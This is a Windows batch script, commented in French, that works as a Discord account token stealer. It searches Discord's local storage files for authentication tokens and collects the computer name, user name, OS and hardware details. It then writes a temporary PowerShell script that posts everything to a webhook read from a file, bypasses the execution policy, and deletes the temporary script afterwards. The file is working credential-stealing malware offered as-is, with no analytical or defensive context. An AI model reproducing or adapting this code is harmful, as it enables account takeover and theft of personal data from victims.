@echo off
setlocal enabledelayedexpansion

:: Vérifiez si le fichier webhook.txt existe
if not exist "webhook.txt" (
    echo Le fichier webhook.txt n'existe pas dans le répertoire courant.
    pause
    exit /b
)

:: Lire le webhook à partir du fichier
for /f "delims=" %%i in (webhook.txt) do set webhook=%%i

:: Chemin vers le répertoire des fichiers de configuration de Discord
set discordPath=%LOCALAPPDATA%\Discord

:: Rechercher les tokens dans les fichiers de configuration
for /f "delims=" %%f in ('dir /b /s "%discordPath%\Local Storage\leveldb\*"') do (
    findstr /R /C:"mfa\.[^ ]*" /C:"token\.[^ ]*" "%%f" >nul
    if !errorlevel! equ 0 (
        for /f "delims=" %%t in ('findstr /R /C:"mfa\.[^ ]*" /C:"token\.[^ ]*" "%%f"') do (
            set token=%%t
            goto :found
        )
    )
)

:: Si aucun token n'a été trouvé, afficher un message et quitter
echo Aucun token Discord valide trouvé dans les fichiers de configuration.
pause
exit /b

:found
:: Créer un fichier PowerShell temporaire
echo $webhook = "%webhook%" > %temp%\discord.ps1
echo $token = "%token%" >> %temp%\discord.ps1
echo Write-Host "Debut du script..." >> %temp%\discord.ps1
echo try { >> %temp%\discord.ps1
echo   Write-Host "Collecte des informations..." >> %temp%\discord.ps1
echo   $computerName = $env:COMPUTERNAME >> %temp%\discord.ps1
echo   $userName = $env:USERNAME >> %temp%\discord.ps1
echo   $osInfo = Get-WmiObject -Class Win32_OperatingSystem >> %temp%\discord.ps1
echo   $computerInfo = Get-WmiObject -Class Win32ComputerSystem >> %temp%\discord.ps1
echo   Write-Host "Creation du message..." >> %temp%\discord.ps1
echo   $message = "Informations du PC:`n" >> %temp%\discord.ps1
echo   $message += "Nom du PC: $computerName`n" >> %temp%\discord.ps1
echo   $message += "Utilisateur: $userName`n" >> %temp%\discord.ps1
echo   $message += "OS: " + $osInfo.Caption + "`n" >> %temp%\discord.ps1
echo   $message += "Version: " + $osInfo.Version + "`n" >> %temp%\discord.ps1
echo   $message += "Fabricant: " + $computerInfo.Manufacturer + "`n" >> %temp%\discord.ps1
echo   $message += "Modele: " + $computerInfo.Model + "`n" >> %temp%\discord.ps1
echo   $message += "Token: " + $token + "`n" >> %temp%\discord.ps1
echo   $payload = @{ >> %temp%\discord.ps1
echo     content = $message >> %temp%\discord.ps1
echo   } >> %temp%\discord.ps1
echo   $json = $payload ^| ConvertTo-Json >> %temp%\discord.ps1
echo   Write-Host "Envoi du message..." >> %temp%\discord.ps1
echo   Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json" >> %temp%\discord.ps1
echo   Write-Host "Message envoye avec succes!" -ForegroundColor Green >> %temp%\discord.ps1
echo } catch { >> %temp%\discord.ps1
echo   Write-Host "Erreur: " $.Exception.Message -ForegroundColor Red >> %temp%\discord.ps1
echo   Write-Host "Appuyez sur une touche pour continuer..." >> %temp%\discord.ps1
echo   Read-Host >> %temp%\discord.ps1
echo } >> %temp%\discord.ps1

:: Exécuter le script PowerShell
powershell -ExecutionPolicy Bypass -File %temp%\discord.ps1

:: Nettoyer
del %temp%\discord.ps1 2>nul

echo.
echo Appuyez sur une touche pour continuer...
pause >nul